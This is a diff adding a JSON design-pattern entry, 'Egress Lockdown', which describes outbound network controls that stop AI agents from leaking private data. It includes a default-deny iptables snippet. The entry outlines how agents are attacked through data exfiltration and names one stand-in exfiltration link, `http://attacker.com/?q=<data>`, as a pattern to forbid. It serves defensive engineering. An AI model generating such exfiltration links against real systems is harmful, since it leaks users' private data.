@@ -1,0 +1,23 @@
+{
+  "title": "Egress Lockdown (No-Exfiltration Channel)",
+  "status": "established",
+  "authors": [
+    "Nikola Balic (@nibzard)"
+  ],
+  "based_on": [
+    "Simon Willison (observation)",
+    "Multiple vendor incident reports"
+  ],
+  "category": "Tool Use & Environment",
+  "source": "https://simonwillison.net/2025/Jun/16/lethal-trifecta/",
+  "tags": [
+    "network-sandbox",
+    "exfiltration",
+    "outbound-controls",
+    "security"
+  ],
+  "id": "egress-lockdown-no-exfiltration-channel",
+  "slug": "egress-lockdown-no-exfiltration-channel",
+  "updated_at": "2026-01-05",
+  "body": "\n## Problem\nEven with private-data access and untrusted inputs, attacks fail if the agent has **no way to transmit stolen data**. Many real-world fixes simply removed or filtered outbound channels.\n\n## Solution\nImplement an **egress firewall** for agent tools:\n\n- Allow only specific domains, methods, or payload sizes.  \n- Strip or hash content in any permitted outbound call.  \n- Forbid dynamic link generation (e.g., `http://attacker.com/?q=<data>`).  \n- Where external communication is essential, run it in a separate \"dumb\" worker that cannot see private data.\n\n```bash\n# Docker file example\nRUN iptables -P OUTPUT DROP       # default-deny\nRUN iptables -A OUTPUT -d api.mycompany.internal -j ACCEPT\n```\n\n## How to use it\n\n* Place the agent inside a sandboxed VM or container with outbound rules.\n* Provide needed APIs via an internal proxy; audit that proxy's request schema.\n* Log any DROP events for forensic follow-up.\n\n## Trade-offs\n\n**Pros:** Drastically reduces high-impact leaks; easy to reason about.\n**Cons:** Breaks legitimate integrations; requires proxy stubs for essential calls.\n\n## References\n\n* Multiple vendor post-mortems cited by Willison: Microsoft 365 Copilot, GitHub MCP, GitLab Duo Chatbot fixes all disabled egress paths as the first patch."
+}
